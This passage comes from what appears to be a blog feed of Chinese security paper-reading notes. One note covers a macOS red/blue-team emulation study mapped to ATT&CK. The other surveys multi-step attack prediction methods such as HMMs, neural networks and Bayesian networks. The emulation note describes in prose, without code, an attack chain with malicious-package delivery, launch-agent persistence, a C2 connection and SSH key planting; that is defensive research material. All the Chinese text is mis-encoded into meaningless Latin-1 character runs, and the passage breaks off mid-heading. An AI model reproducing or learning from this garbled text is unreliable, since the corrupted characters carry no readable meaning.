IDï¼Œæœ€åå¯¹æ”»å‡»æƒ…å†µè¿›è¡Œè¯„ä¼°ã€‚é€šè¿‡ç»“åˆè¿™ä¸‰éƒ¨åˆ†ï¼Œä½œè€…å¤„ç†çº¢é˜Ÿæ—¥å¿—å’Œè“é˜ŸæŠ¥å‘Šï¼Œæœ€åç”Ÿæˆä¸€ä¸ªå…¨é¢çš„æ”»é˜²å…³è”å›¾ï¼Œè®©ç”¨æˆ·èƒ½å¤Ÿè½»æ¾è¯†åˆ«ä¸åŒå‚ä¸æ–¹ä¹‹é—´çš„å…³ç³»ã€‚</p><h3 id="æ”»é˜²å…³è”å›¾"><a href="#æ”»é˜²å…³è”å›¾" class="headerlink" title="æ”»é˜²å…³è”å›¾"></a>æ”»é˜²å…³è”å›¾</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/fc0563ee-953d-4b80-9f1b-cd8cba4d94d0.png"></p><p>æ”»é˜²å…³è”å›¾çš„æ ¸å¿ƒæ˜¯ATT&amp;CKçŸ©é˜µï¼Œè¿™ä¸ªçŸ©é˜µç›¸ä¿¡å¤§å®¶å¤šå°‘éƒ½äº†è§£è¿‡ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚ä½œè€…åœ¨æ­¤åŸºç¡€ä¸Šæ„å»ºäº†ä¸€ä¸ªæ”»é˜²å…³è”å›¾ï¼Œç”¨äºè¯„ä¼°çº¢é˜Ÿå’Œè“é˜Ÿã€‚ä¸Šå›¾ä¸ºæ”»é˜²å…³è”å›¾çš„ä¸€ä¸ªæ ·ä¾‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°å…¶æ ¹æœ¬ç›®çš„è¿˜æ˜¯ä¸ºäº†æè¿°æ”»å‡»å’Œé˜²å¾¡æŠ€æœ¯ä¹‹é—´çš„å…³ç³»ã€‚å¯¹äºæ”»å‡»æ–¹ï¼ˆçº¢é˜Ÿï¼‰ï¼Œå¿…é¡»è¦æ ¹æ®ATT&amp;CKçŸ©é˜µæ¥ç¡®å®šæ”»å‡»è¿‡ç¨‹ä¸­æ‰€æ¶‰åŠçš„æ”»å‡»æŠ€æœ¯ï¼›å¯¹äºé˜²å¾¡æ–¹ï¼Œåˆ™æ˜¯éœ€è¦æ‰¾åˆ°è¡Œä¹‹æœ‰æ•ˆçš„æ£€æµ‹å·¥å…·å’Œå–è¯å·¥å…·ï¼Œå¹¶æ•´ç†å‡ºè¿™äº›å·¥å…·äº§ç”Ÿçš„è®°å½•ï¼ˆå¦‚äº‹ä»¶ã€ç™»å½•è®°å½•ç­‰ï¼‰ã€‚å¦‚æœè¿™äº›è®°å½•ä¸­èƒ½å¤Ÿå¯¹åº”ä¸Šæ”»å‡»æ‰‹æ®µå¯èƒ½å¯¼è‡´äº§ç”Ÿçš„è®°å½•ï¼Œåˆ™åœ¨æ”»å‡»æŠ€æœ¯å’Œè®°å½•ä¸­æ·»åŠ å…³è”ï¼Œä¾‹å¦‚æ–‡ä»¶æ“ä½œäº‹ä»¶å¯ä»¥ä¸T1105è¿œç¨‹æ–‡ä»¶å¤åˆ¶æŠ€æœ¯äº§ç”Ÿå…³è”ã€‚å¯¹äºMacOSæ¥è¯´æœ‰å¾ˆå¤šå¯ä»¥è¢«æ£€æµ‹å·¥å…·å’Œå–è¯å·¥å…·æ‰€ç•™ä¸‹æ¥çš„è®°å½•ï¼ŒåŒ…æ‹¬ç³»ç»Ÿæ—¥å¿—ã€é’¥åŒ™ä¸²ã€é€šç”¨æ—¥å¿—ç­‰ã€‚æ ¹æ®è¿™äº›è®°å½•ï¼Œä¾¿å¯ä»¥è¿½è¸ªæ”»å‡»è€…çš„æ´»åŠ¨ã€‚</p><p>åœ¨è¯»è€…çœ‹æ¥ï¼Œä½œè€…æ‰€æå‡ºçš„è¿™ç§å…³è”å›¾å…¶å®å¹¶ä¸å±€é™äºMacOSï¼Œä½†éœ€è¦é™å®šåœºæ™¯ä½¿ç”¨ï¼Œé‡‡ç”¨è¯¥å…³è”å›¾æœ‰å‡ ä¸ªä¼˜ç‚¹ã€‚ä¸€æ˜¯ä»çº¢é˜Ÿçš„è§’åº¦æ¥çœ‹ï¼Œè¯¥å›¾æ€»ç»“äº†æ”»å‡»æ–¹ä¼šä½¿ç”¨åˆ°çš„ä¸€äº›æŠ€æœ¯ï¼Œå®‰å…¨ä»ä¸šè€…ä¾¿èƒ½å¤Ÿé€šè¿‡è§‚å¯Ÿä»è¿™ä¸ªè§’åº¦å‡ºå‘å¸¸è§çš„æ”»å‡»æŠ€æœ¯ï¼Œä»¥å®ç°æ›´å¥½çš„é˜²æŠ¤ï¼›äºŒæ˜¯ä»è“é˜Ÿçš„è§’åº¦å‡ºå‘ï¼Œæ£€æµ‹å·¥å…·å’Œå–è¯å·¥å…·åŠå…¶å¯¹åº”èƒ½å¤Ÿäº§ç”Ÿçš„è®°å½•åˆ™å±•ç¤ºäº†è¿™äº›å·¥å…·çš„èƒ½åŠ›ï¼Œå¯¹äºå®‰å…¨ä»ä¸šè€…æ¥è¯´å¯ä»¥æŒ‰éœ€é€‰æ‹©å’Œéƒ¨ç½²è¿™äº›å·¥å…·ã€‚</p><h3 id="çº¢é˜Ÿè§’åº¦-è“é˜Ÿè§’åº¦"><a href="#çº¢é˜Ÿè§’åº¦-è“é˜Ÿè§’åº¦" class="headerlink" title="çº¢é˜Ÿè§’åº¦/è“é˜Ÿè§’åº¦"></a>çº¢é˜Ÿè§’åº¦/è“é˜Ÿè§’åº¦</h3><p>ä½œè€…åœ¨å¼€å‘çº¢é˜Ÿä»¿çœŸå·¥å…·æ—¶ï¼Œé‡‡ç”¨äº†æ¨¡å—åŒ–çš„æ–¹å¼è¿›è¡Œæ„å»ºï¼ŒåŒæ—¶åœ¨æœ€æ–°çš„MacOSä¸Šè¿›è¡Œæµ‹è¯•ï¼Œä»¥ç¡®ä¿å…¶æœ‰æ•ˆæ€§ã€‚å¯¹äºæ•´ä¸ªæ¨¡å—åŒ–çš„æµç¨‹æ¥è¯´ï¼Œä¿è¯å…¶æœ‰æ•ˆæ€§å…¶å®ä¹Ÿå°±æ˜¯ä¿è¯å¯¹åº”æ”»å‡»æ¨¡å—çš„æ—¶æ•ˆæ€§ã€‚</p><p>åœ¨è“é˜Ÿè§’åº¦ï¼Œä½œè€…è°ƒæŸ¥äº†å‡ ä¸ªè‘—åçš„è“é˜Ÿç”¨çš„å–è¯å·¥å…·ï¼Œå¹¶æ€»ç»“äº†è¿™äº›å·¥å…·èƒ½å¤Ÿæä¾›çš„è®°å½•ï¼Œç„¶åå°†å…¶æ•´åˆï¼Œä»¥å½¢æˆè“é˜Ÿå·¥å…·åŒ…ã€‚æŒ‰ç…§é˜¶æ®µåˆ’åˆ†ï¼Œä½œè€…æä¾›çš„è“é˜Ÿå·¥å…·åŒ…åŒ…æ‹¬äº†ä¸¤ä¸ªé˜¶æ®µï¼š1)ä¿¡æ¯æ”¶é›†é˜¶æ®µï¼›2)æ¶æ„è¡Œä¸ºæ£€æµ‹é˜¶æ®µã€‚å‰ä¸€é˜¶æ®µä¸»è¦æ˜¯æ”¶é›†æ”»å‡»è¿‡ç¨‹ä¸­çš„åŠ¨æ€ä¿¡æ¯ï¼ˆé‡‡é›†è‡ªåŠ¨æ€ç›‘æ§å·¥å…·ï¼‰å’Œé™æ€ä¿¡æ¯ï¼ˆé‡‡é›†è‡ªé™æ€å–è¯å·¥å…·ï¼‰ï¼Œç„¶ååé¦ˆè‡³åä¸€é˜¶æ®µï¼Œä»¥è¯†åˆ«æ¶æ„è¡Œä¸ºå¹¶æ ‡è®°ATT&amp;CK IDã€‚</p><h2 id="0x03-Evaluation"><a href="#0x03-Evaluation" class="headerlink" title="0x03 Evaluation"></a>0x03 Evaluation</h2><p>ä½œè€…åˆ©ç”¨å…¶çº¢é˜Ÿä»¿çœŸå·¥å…·æ„å»ºäº†ä¸€æ•´ä¸ªAPTæ”»å‡»æµç¨‹ï¼Œå¹¶ä½¿ç”¨å…¶è“é˜Ÿå·¥å…·åŒ…æ¥æ£€æµ‹ã€‚</p><p>æ”»å‡»å¼€å§‹ï¼Œçº¢é˜Ÿé¦–å…ˆåˆ©ç”¨CVE-2018-6574åœ¨Githubä¸Šå»ºç«‹ä¸€ä¸ªæ¶æ„åŒ…ã€‚åœ¨å¾—åˆ°è¿™ä¸ªæ¶æ„åŒ…åï¼Œä»¿çœŸå·¥å…·è¢«æ‰§è¡Œï¼Œå¹¶å°†è‡ªèº«å¤åˆ¶ä¸ºç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ä¸€ä¸ªéšè—ç›®å½•ã€‚åŒæ—¶ï¼Œå®ƒè¿˜å°†æ·»åŠ ä¸€ä¸ªplistæ–‡ä»¶ï¼Œä»¥æ³¨å†Œä¸€ä¸ªç”¨æˆ·çº§çš„LaunchAgentã€‚ç„¶åï¼Œå®ƒä¼šé€šè¿‡ä¸€ä¸ªsocketè¿æ¥åˆ°å¯¹åº”çš„C2æœåŠ¡å™¨ï¼Œçº¢é˜Ÿä¾¿èƒ½å¤Ÿåˆ©ç”¨shellå‘½ä»¤æ¥æ”¶é›†ä¸»æœºä¸Šçš„æ•æ„Ÿä¿¡æ¯ã€‚åŒæ—¶ï¼Œå®ƒè¿˜ä¼šæ‰«æSSHé…ç½®æ–‡ä»¶ï¼Œå¹¶å‘æ²¦é™·ä¸»æœºä¸­æ·»åŠ è‡ªå·±çš„å…¬é’¥ã€‚éšåï¼Œçº¢é˜Ÿé€šè¿‡è¿›ç¨‹å‘ç°ã€å±å¹•ç›‘æ§åŠç‰¹æƒæå‡ç­‰æ‰‹æ®µï¼Œæ³¨å†Œä¸€ä¸ªç³»ç»Ÿçº§çš„LaunchDaemonï¼Œä¾¿èƒ½å¤Ÿä»¥rootèº«ä»½è¿›è¡Œæ›´é«˜æƒé™çš„æ“ä½œäº†ã€‚</p><p>ä¸‹è¡¨ä¸ºè¯„ä¼°ç»“æœï¼Œåˆ—å‡ºäº†ä¸Šè¿°æ”»å‡»æµç¨‹ä¸­ä¼šç”¨åˆ°çš„æŠ€æœ¯ï¼Œä»¥åŠè“é˜Ÿå·¥å…·åŒ…çš„æ£€æµ‹ç»“æœã€‚ä»ç»“æœä¸éš¾çœ‹å‡ºï¼Œè“é˜Ÿçš„æ£€æµ‹ç»“æ„ä»å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äºè¿‡æ»¤è§„åˆ™çš„å®Œæ•´æ€§å’Œå¯ç”¨æ€§ã€‚å› æ­¤ï¼Œä¸æ”¯æŒçš„éƒ¨åˆ†ä¸»è¦æ˜¯ç”±äºç°æœ‰çš„æ£€æµ‹è§„åˆ™å€¾å‘äºå‘ç°é˜¶æ®µï¼Œè€Œéå®é™…å‘ç”Ÿæ¶æ„è¡Œä¸ºé˜¶æ®µæ‰€é€ æˆçš„ã€‚å°½ç®¡ä½œè€…åœ¨ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ä¸­è®°å½•äº†å°½å¯èƒ½å¤šçš„ç³»ç»Ÿä¿¡æ¯ï¼Œä½†åœ¨åˆå§‹ä½æƒé™é˜¶æ®µå’Œæƒé™æå‡é˜¶æ®µï¼Œæ˜¯å¾ˆéš¾åŒºåˆ†æ¶æ„è®°å½•å’Œæ­£å¸¸è®°å½•çš„ï¼Œä½œè€…å°†è¿™ä¸ªé—®é¢˜ä½œä¸ºå…¶æœªæ¥ç ”ç©¶çš„ä¸»è¦å·¥ä½œä¹‹ä¸€ã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/316b72aa-8e6a-4b22-9504-614525b54f0d.png"></p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>æ€»çš„æ¥è¯´ï¼Œä½œè€…æ‰“ç®—æŠ›ç –å¼•ç‰ä»¥å¼•èµ·ç ”ç©¶äººå‘˜å¯¹äºMacOSæ”»é˜²æ–¹é¢çš„ç ”ç©¶å…´è¶£ã€‚è¯šç„¶ç°åœ¨å¾ˆå¤šå¾ˆå¤šå®‰å…¨è®¾å¤‡éƒ½æ˜¯é’ˆå¯¹Windowsæˆ–æ˜¯Linuxçš„ï¼Œè¿™æ˜¯å®é™…ç”Ÿäº§ç¯å¢ƒå†³å®šçš„ã€‚ä½†æ˜¯MacOSä½œä¸ºå¤§é‡å®‰å…¨ä»ä¸šè€…æ‰€ä½¿ç”¨çš„è®¾å¤‡ï¼Œåœ¨å…¶ä¹‹ä¸Šçš„æ”»é˜²æ˜¯ä¸èƒ½å¤Ÿå¿½è§†çš„ã€‚è¯»è€…è®¤ä¸ºä½œè€…å¯èƒ½æƒ³è¡¨è¾¾çš„æ˜¯ï¼šä¹Ÿè®¸ç³»ç»Ÿæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿçš„ç®¡ç†å‘˜æ‰€ä½¿ç”¨çš„PCå¹¶ä¸ä¸€å®šã€‚é‚£äº›é‡é‡å¸ƒé˜²éš¾ä»¥æ”»ç ´çš„ç³»ç»Ÿï¼Œæ”»å‡»è€…å®Œå…¨å¯ä»¥ä¸ä»æ­£é¢çªç ´ï¼Œè½¬è€Œæ”»å‡»é‚£äº›æ“ä½œç³»ç»Ÿçš„äººï¼Œæœ€ç»ˆä¹Ÿèƒ½è¾¾åˆ°ç›¸åŒçš„ç›®çš„ã€‚å› æ­¤ï¼ŒMacOSä¸Šçš„æ”»é˜²ä¹Ÿæ˜¯å€¼å¾—æ³¨æ„å’Œç ”ç©¶çš„ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASIACCS&#39;20 </tag>
            
            <tag> Attack &amp; Defense </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - A Survey on Methodologies for Multi-Step Attack Prediction</title>
      <link href="/2021/11/16/A%20Survey%20on%20Methodologies%20for%20Multi-Step%20Attack%20Prediction/"/>
      <url>/2021/11/16/A%20Survey%20on%20Methodologies%20for%20Multi-Step%20Attack%20Prediction/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šS Ingale, M Paraye</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šA Survey on Methodologies for Multi-Step Attack Prediction</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://ieeexplore.ieee.org/abstract/document/9171106">https://ieeexplore.ieee.org/abstract/document/9171106</a></em></p><p><em>åŸæ–‡æ¥æºï¼šICISC 2020</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>é¦–å…ˆéœ€è¦çŸ¥é“çš„æ¦‚å¿µæ˜¯Multi-Stepï¼Œä¹Ÿå«Multi-Stageï¼Œç›¸ä¿¡å¯¹csç†Ÿæ‚‰çš„æœ‹å‹åº”è¯¥éƒ½èƒ½æ˜ç™½æ‰€è°“stepæˆ–è€…stageæŒ‡çš„æ˜¯è¿™ä¸€ç±»å‹çš„æ”»å‡»é€šå¸¸æ˜¯å¤šæ­¥èµ°ï¼Œå¤šä¸ªé˜¶æ®µè¿›è¡Œçš„ï¼Œä¸æ˜¯ä¸€æ¬¡æ€§çš„ã€‚å¯¹äºè¿™ç±»æ”»å‡»ï¼Œé˜¶æ®µæ€§çš„æˆæœåªæ˜¯è¾¾æˆæœ€ç»ˆç›®æ ‡çš„ä¸€ä¸ªè·¯å¾„ï¼Œåœ¨æ”»å‡»è€…å®ç°æœ€ç»ˆç›®æ ‡ä¹‹å‰è¿™äº›é˜¶æ®µæ€§çš„æ”»å‡»å¯èƒ½æˆ–å¤šæˆ–å°‘èƒ½å¤Ÿè¢«å®‰å…¨è®¾å¤‡æ•æ‰åˆ°ï¼Œä½†åƒä¼ ç»ŸIDSè¿™ç±»é˜²å¾¡æªæ–½æ˜¯ä¸è¶³ä»¥å®Œæ•´æŒ–æ˜å‡ºæ”»å‡»è·¯å¾„å¹¶åŠæ—¶åé¦ˆå‡ºæ”»å‡»è€…çš„ä¸‹ä¸€æ­¥è¡ŒåŠ¨çš„ã€‚äºæ˜¯ä½œè€…ç€çœ¼äºè¿™ç±»æ”»å‡»æ£€æµ‹æ–¹æ³•çš„æ€§èƒ½æŒ‡æ ‡ï¼Œå›é¡¾æœ€å¸¸ç”¨çš„ç”¨äºé¢„æµ‹å¤šæ­¥éª¤æ”»å‡»çš„æ–¹æ³•ï¼Œä»¥æŒ‡å¯¼ç ”ç©¶äººå‘˜ä¸ºä¸åŒçš„å¤šæ­¥éª¤æ”»å‡»åœºæ™¯é€‰æ‹©æœ€ä¸ºåˆé€‚çš„æ–¹æ³•ã€‚</p><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>æ—©æœŸç”¨äºæ£€æµ‹ä¼ ç»Ÿç½‘ç»œæ”»å‡»çš„æ–¹æ³•å·²ç»ä¸å¤ªé€‚ç”¨äºæ£€æµ‹å’Œé¢„æµ‹å¤šæ­¥éª¤æ”»å‡»ã€‚ç›®å‰é’ˆå¯¹å¤šæ­¥éª¤æ”»å‡»çš„æ£€æµ‹å’Œé¢„æµ‹é€šå¸¸æ˜¯é€šè¿‡ç»“åˆå‡ ä¸ªç‰¹å®šçš„äº‹ä»¶æ¥è¿›è¡Œçš„ï¼Œä½†ç½‘ç»œä¸­æˆ‘ä»¬ä¸å¯èƒ½ä¿è¯æ‰€æœ‰è¿è¡Œçš„æœåŠ¡éƒ½æ˜¯ç»å¯¹å®‰å…¨çš„ã€‚è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªå–èˆï¼Œåˆ°åº•æ˜¯è¦å®‰å…¨è¿˜æ˜¯ç”¨æˆ·ä½“éªŒã€‚äºæ˜¯è€ƒè™‘åˆ°è¿™ä¸ªå±€é™æ€§ï¼Œé—®é¢˜å°±è½¬å˜ä¸ºåˆ¶å®šä¸€ä¸ªé™åˆ¶ç¨‹åº¦å¯æ¥å—çš„å¤šæ­¥éª¤æ”»å‡»æ£€æµ‹å’Œé¢„æµ‹æ–¹æ³•ã€‚</p><p>è¿™ä¸ªé—®é¢˜çš„å…³é”®æŒ‘æˆ˜åœ¨äºå¦‚ä½•é¢„æµ‹å¤æ‚å¤šå˜çš„æ”»å‡»æ‰‹æ³•ï¼Œé€šå¸¸æ¥è¯´è¿™ç±»æ”»å‡»æ˜¯ç”±å¤šä¸ªä¸åŒæ­¥éª¤ç»„æˆçš„ç”¨äºå®ç°æ”»å‡»è€…æœ€ç»ˆç›®æ ‡çš„ä¸€ç³»åˆ—æ”»å‡»ã€‚ä½†ç”±äºç½‘ç»œæµé‡æ•°æ®çš„å¤æ‚æ€§ï¼Œæ”»å‡»æµé‡ä¸æ­£å¸¸æµé‡æ··æ‚éš¾ä»¥åŒºåˆ«ï¼Œä»æµ·é‡æ•°æ®ä¸­ç­›æŸ¥å‡ºæ”»å‡»æµé‡å°±çŠ¹å¦‚æµ·åº•æé’ˆäº†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›ç‰¹å®šç¯å¢ƒå’Œåœºæ™¯ä¸‹æ‰èƒ½å‘åŠ¨çš„æ”»å‡»ï¼Œè¿™ç§æƒ…å†µä½œè€…ç§°ä¹‹ä¸ºç¨€æœ‰æ•°æ®(rare-data)æŒ‘æˆ˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®­ç»ƒä¸€ä¸ªæ¨¡å‹æ¥æ£€æµ‹è¿™ç§æ•°é‡ç½•æœ‰çš„æ”»å‡»æ˜¯ä¸€ä»¶å‡ ä¹æ— æ³•å®Œæˆçš„äº‹ã€‚</p><p>é™¤äº†ä¸Šè¿°æŒ‘æˆ˜ä»¥å¤–ï¼Œåœ¨é¢„æµ‹å¤šæ­¥éª¤æ”»å‡»æ—¶ä¼šé‡åˆ°çš„å¦ä¸€ä¸ªæŒ‘æˆ˜/é˜»ç¢æ˜¯æåº¦ä¸å¹³è¡¡çš„æ•°æ®é›†ã€‚è¿™ä¸»è¦æ˜¯å› ä¸ºè¦åšå¤šæ­¥éª¤æ”»å‡»æ£€æµ‹å’Œé¢„æµ‹ï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°æ”»å‡»é˜¶æ®µä¹‹é—´çš„å…³è”æ€§æˆ–ç›¸ä¼¼æ€§ï¼Œæ›´é‡è¦çš„æ˜¯ä¸ä»…è¦çŸ¥é“æ”»å‡»ç±»å‹ï¼Œè¿˜è¦çŸ¥é“æ”»å‡»çš„æ€§è´¨å’Œç›®çš„ã€‚ä¸€æ—¦ç¼ºå¤±äº†ä¸€éƒ¨åˆ†ä¿¡æ¯ï¼Œé‚£ä¹ˆæ„å»ºèµ·æ¥çš„æ£€æµ‹æ¨¡å‹æ•ˆæœä¸€å®šæ˜¯ä¸å¤ªå¥½çš„ã€‚æ‰€ä»¥è¿™ç§é—®é¢˜ä¹Ÿè¢«ç§°ä¸ºæ˜¯â€œæ•°æ®ç¼ºå¤±â€é—®é¢˜ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦å…ˆå¯¹ä¼ å…¥çš„æœªçŸ¥æ”»å‡»è¿›è¡Œåˆ†ç±»ï¼Œç„¶åæ‰èƒ½å¤Ÿè¾“å…¥æ¨¡å‹è¿›è¡Œè®­ç»ƒã€‚</p><h2 id="Algorithms-Mechanisms"><a href="#Algorithms-Mechanisms" class="headerlink" title="Algorithms/Mechanisms"></a>Algorithms/Mechanisms</h2><pre><code>ä»¥ä¸‹æ¶‰åŠåˆ°çš„å…·ä½“è®ºæ–‡æ–¹æ³•è¯·è‡³åŸæ–‡ä¸­æŸ¥çœ‹</code></pre><h3 id="Hidden-Markov-Models"><a href="#Hidden-Markov-Models" class="headerlink" title="Hidden Markov Models"></a>Hidden Markov Models</h3><p>éšé©¬å°”å¯å¤«æ¨¡å‹ï¼ˆHMMï¼‰æ˜¯ç›®å‰åº”ç”¨äºå¤šæ­¥éª¤æ”»å‡»é¢„æµ‹çš„ä¼—å¤šæ¨¡å‹ä¸­ä½¿ç”¨æœ€å¹¿æ³›çš„ï¼ŒHMMæ¨¡å‹ä¸­çš„å­˜åœ¨ç€ä¸€å®šæ•°é‡çš„éšè—æ€ï¼Œä½†ä¸è®ºå¦‚ä½•æ¯ä¸€ä¸ªçŠ¶æ€éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªè§‚å¯Ÿå€¼ã€‚å¯¹äºè¯•éªŒè€…æ¥è¯´ï¼Œåªæœ‰é‚£äº›ç”±ç‰¹å®šçŠ¶æ€æ‰€äº§ç”Ÿçš„è§‚å¯Ÿå€¼æ˜¯å€¼å¾—æ³¨æ„çš„ã€‚ç”±æ­¤ï¼Œè¯¥æ¨¡å‹æ‰€è°“çš„çŠ¶æ€å¾ˆå®¹æ˜“åœ°èƒ½å¤Ÿå’Œå¤šæ­¥éª¤æ”»å‡»ä¸­çš„æ¯ä¸€æ­¥è¿›è¡Œå…³è”ï¼Œè¿™ä¹Ÿæ˜¯è¯¥æ¨¡å¼é€‚ç”¨äºå¤šæ­¥éª¤æ”»å‡»é¢„æµ‹çš„åŸå› ã€‚é€šè¿‡è¯¥æ¨¡å‹ï¼Œèƒ½å¤Ÿæ ¹æ®å…ˆéªŒçš„æ”»å‡»åºåˆ—æ¥ç¡®å®šæœªçŸ¥æ”»å‡»æ‰€å±çš„ç±»å‹è±¡é™ã€‚</p><p>è™½ç„¶HMMæœ‰ç€ä¸Šè¿°ä¼˜ç‚¹ï¼Œä½†å…¶ç”¨æ¥é¢„æµ‹æ”»å‡»åºåˆ—çš„viterbiç®—æ³•éœ€è¦å¤§é‡çš„è®¡ç®—æ—¶é—´å’Œå†…å­˜æ¶ˆè€—ï¼Œåºåˆ—é•¿åº¦ä¸æ‰€éœ€æ—¶é—´æˆæ­£æ¯”ã€‚é€šå¸¸æ¥è¯´ï¼Œè¾ƒå¤§ä½†ä¸æ˜¯å·¨å¤§çš„åºåˆ—å’Œç‰¹å¾é›†æ¯”è¾ƒé€‚ç”¨ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè®­ç»ƒHMMæ¨¡å‹è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯éœ€è¦åˆç†è°ƒå‚ï¼Œä»¥ä½¿å¾—æ¨¡å‹èƒ½å¤Ÿå¿«é€Ÿæ”¶æ•›ï¼Œå‡å°‘è¿­ä»£æ¬¡æ•°ã€‚</p><h3 id="Artificial-Neural-Networks"><a href="#Artificial-Neural-Networks" class="headerlink" title="Artificial Neural Networks"></a>Artificial Neural Networks</h3><p>äººå·¥ç¥ç»ç½‘ç»œï¼ˆANNï¼‰èƒ½å¤Ÿæ ¹æ®ä¸€äº›æ ‡è®°æ•°æ®æˆ–èšç±»ç®—æ³•æ¥ç†è§£è¾“å…¥çš„æ•°æ®ï¼Œä¸€ä¸ªANNæ˜¯ä¸€ä¸ªä¸ªç¥ç»å…ƒçš„ç›¸äº’è¿æ¥ï¼Œç¥ç»å…ƒç»“åˆè¾“å…¥å’Œç›¸å…³æƒé‡è¿›è¡Œè®¡ç®—ï¼Œå°†ç»“æœåé¦ˆç»™æ¿€æ´»å‡½æ•°ï¼Œä»¥ç¡®å®šä¿¡å·æ˜¯å¦èƒ½å¤Ÿé€šè¿‡ã€‚ä¸¾ä¸€ä¸ªå®ä¾‹ï¼Œå°†ANNå¼•å…¥è‡³IDSä¸­ï¼Œå®ƒä»ç½‘ç»œå…¥ä¾µæ•°æ®é›†ä¸­æå–ç‰¹å¾ï¼Œå¹¶é¢„æµ‹æ”»å‡»ç±»å‹ã€‚å…³äºç¥ç»ç½‘ç»œçš„å­¦ä¹ è¿‡ç¨‹è¿™é‡Œä¸å†èµ˜è¿°ï¼Œå½’æ ¹åˆ°åº•æ˜¯è¦è®©å…¶æ”¶æ•›ã€‚</p><p>ANNåœ¨å®é™…ç”Ÿäº§ç¯å¢ƒå·²ç»è¢«è¯æ˜æ˜¯èƒ½å¤ŸæˆåŠŸæ£€æµ‹å’Œé¢„æµ‹æ”»å‡»çš„äº†ï¼Œå®ƒèƒ½å¤Ÿé€šè¿‡ç›‘æµ‹å’Œä»æ•°æ®é›†ä¸­å­¦ä¹ æ¥åšåˆ°åœ¨æ­£å¸¸æˆ–å¼‚å¸¸çš„åŸºç¡€åˆ†ç±»ä¸Šå¯¹æ”»å‡»è¿›è¡Œæ›´é«˜å±‚æ¬¡çš„åˆ†ç±»ã€‚ä½†ANNçš„ç¼ºç‚¹ä¹Ÿååˆ†æ˜æ˜¾ï¼Œè™½ç„¶å…¶èƒ½å¤Ÿå¤„ç†å¤§é‡æ•°æ®ï¼Œä½†å…¶è¿›èƒ½å¤Ÿåˆ†æç°æœ‰æ•°æ®å¹¶ä½œå‡ºåˆ¤æ–­ï¼Œå¹¶ä¸é€‚ç”¨äºå®æ—¶æ•°æ®å¤„ç†ï¼Œå³æ²¡æœ‰å¾ˆå¥½çš„åŠæ³•é¢„æµ‹å®æ—¶å…¥ä¾µã€‚</p><h3 id="Bayesian-Networks"><a href="#Bayesian-Networks" class="headerlink" title="Bayesian Networks"></a>Bayesian Networks</h3><p>è´å¶æ–¯ç½‘ç»œæ˜¯åŸºäºæ¡ä»¶æ¦‚ç‡åŸç†å·¥ä½œçš„ä¸€ä¸ªæ¦‚ç‡æ¨¡å‹ï¼Œæœ¬è´¨ä¸Šæ¥è¯´è´å¶æ–¯ç½‘ç»œæ˜¯ä¸€ä¸ªåŒ…å«èŠ‚ç‚¹å’Œè¾¹çš„æœ‰å‘æ— ç¯å›¾ï¼ŒèŠ‚ç‚¹ä»£è¡¨éšæœºå˜é‡ï¼Œè€Œè¾¹ä»£è¡¨è¿™äº›å˜é‡ä¹‹é—´çš„æ¡ä»¶ç‹¬ç«‹æ€§ã€‚æ‰€è°“æ¡ä»¶æ¦‚ç‡ï¼ŒæŒ‡çš„æ˜¯ä¸€ä¸ªèŠ‚ç‚¹åœ¨ç»™å®šæ—¶é—´å¤„äºç‰¹å®šçŠ¶æ€çš„æ¦‚ç‡ï¼Œè€Œæ¯ä¸ªè´å¶æ–¯ç½‘ç»œä¸­ä¸€å®šå­˜åœ¨ä¸€ä¸ªçˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹ï¼Œå­èŠ‚ç‚¹çš„æ¦‚ç‡å–å†³äºçˆ¶èŠ‚ç‚¹ã€‚</p><p>ä»¥ä¸€ä¸ªå®é™…ä¾‹å­æ¥è¯´æ˜ï¼šåˆ©ç”¨è´å¶æ–¯ç½‘ç»œå»ºç«‹çš„è´å¶æ–¯åˆ†ç±»å™¨èƒ½å¤Ÿè¯†åˆ«æ­£å¸¸å’Œæ¶æ„TCPæµé‡ä¸­å‡ºç°çš„å…·æœ‰ä¸åŒæ¦‚ç‡çš„ç‰¹å¾ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªé¢„å®šä¹‰çš„è®­ç»ƒæ¨¡å‹ï¼Œå°†æµé‡åˆ†ç±»ä¸ºæ­£å¸¸æˆ–æ¶æ„ã€‚è´å¶æ–¯æœ€å¤§çš„ä¼˜ç‚¹å°±åœ¨äºå…¶æ˜“äºå®ç°ï¼Œä½†æ•ˆæœä»…ä»…åªæ˜¯èµ¶å¾—ä¸Šåˆ«çš„æ–¹æ³•ã€‚</p><h3 id="Machine-Learning-Techniques"><a href="#Machine-Learning-Techniques" class="headerlink" title="Machine Learning Techniques"></a>Machine Learning 